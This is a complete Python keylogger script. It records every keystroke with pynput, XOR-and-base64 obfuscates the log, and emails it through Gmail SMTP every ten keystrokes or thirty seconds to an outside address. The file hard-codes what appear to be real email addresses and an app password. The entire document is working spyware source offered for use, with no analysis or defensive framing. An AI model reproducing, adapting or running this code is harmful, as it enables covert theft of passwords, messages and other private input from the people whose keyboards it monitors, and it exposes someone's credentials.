#!/usr/bin/env python3
from pynput.keyboard import Key, Listener
import smtplib, ssl, base64, time, sys

XOR_KEY = 'ultraprohacker'

def obfuscate(text):
    raw = text.encode()
    kb = XOR_KEY.encode()
    kl = len(kb)
    enc = bytes([raw[i] ^ kb[i % kl] for i in range(len(raw))])
    return base64.b64encode(enc).decode()

def send_email(content):
    try:
        ctx = ssl.create_default_context()
        with smtplib.SMTP('smtp.gmail.com', 587, timeout=15) as s:
            s.ehlo()
            s.starttls(context=ctx)
            s.ehlo()
            s.login('abdulsalamyt72@gmail.com', 'pudp tnfe ngca tuyi')
            s.sendmail('abdulsalamyt72@gmail.com', 'salamkhan0237@gmail.com', 
                      f'Subject: Keylog Data\n\n{obfuscate(content)}')
        print(f'\n[✓] Email sent! ({len(content)} chars)')
        return True
    except Exception as e:
        print(f'\n[✗] Email error: {e}')
        return False

# Store keystrokes
keystrokes = []
count = 0
last_send = time.time()

def on_press(key):
    global count, last_send, keystrokes
    
    # Convert key to character
    char = None
    try:
        if hasattr(key, 'char') and key.char is not None:
            char = key.char
        elif key == Key.space:
            char = ' '
        elif key == Key.enter:
            char = '\n'
        elif key == Key.tab:
            char = '    '
    except:
        pass
    
    # If we got a character, add it
    if char:
        keystrokes.append(char)
        count += 1
        
        # Show the character immediately
        sys.stdout.write(char)
        sys.stdout.flush()
        
        # Send email every 10 keystrokes
        if count % 10 == 0:
            print(f'\n[>>> Sending email at {count} keystrokes]')
            if keystrokes:
                all_text = ''.join(keystrokes)
                send_email(all_text)
        
        # Send email every 30 seconds
        if time.time() - last_send >= 30:
            print(f'\n[>>> Sending email (30 second timer)]')
            if keystrokes:
                all_text = ''.join(keystrokes)
                send_email(all_text)
            last_send = time.time()

print('\n' + '='*60)
print('KEYLOGGER ACTIVE - Type anything')
print('Emails sent every 10 keystrokes OR every 30 seconds')
print('Press Ctrl+C to stop and send final email')
print('='*60 + '\n')

# Start listener
with Listener(on_press=on_press) as listener:
    try:
        listener.join()
    except KeyboardInterrupt:
        print('\n\n>>> Sending FINAL email with all keystrokes...')
        if keystrokes:
            all_text = ''.join(keystrokes)
            print(f'\nCaptured: "{all_text}"')
            send_email(all_text)
        print('Done! Check your email spam folder')
